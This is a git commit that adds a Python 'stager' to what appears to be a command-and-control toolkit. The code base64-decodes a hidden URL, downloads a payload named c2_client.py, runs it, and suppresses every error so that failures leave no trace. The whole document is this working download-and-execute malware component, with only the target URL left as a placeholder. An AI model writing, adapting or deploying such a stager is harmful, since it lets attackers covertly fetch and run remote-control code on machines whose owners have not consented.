469e06ce124195bc115b4325a2ca0ab4fb7c38ad
cwsecur1ty <csheppardoff@gmail.com>
2024-08-01 14:57:46 +0100

    Minimal encoded stager using base 64.

---
+++ Main/Stagers/py_b64_stager.py
@@ -0,0 +1,14 @@
+import urllib.request as u, subprocess as s, os, base64
+
+# Base64 encoded URL to download the c2_client.py payload
+encoded_url = 'insert_base64_url'
+payload_url = base64.b64decode(encoded_url).decode('utf-8')
+payload_filename = 'c2_client.py'
+
+# Download and execute the payload
+try:
+    u.urlretrieve(payload_url, payload_filename)
+    if os.path.isfile(payload_filename):
+        s.run(['python', payload_filename])
+except Exception:
+    pass
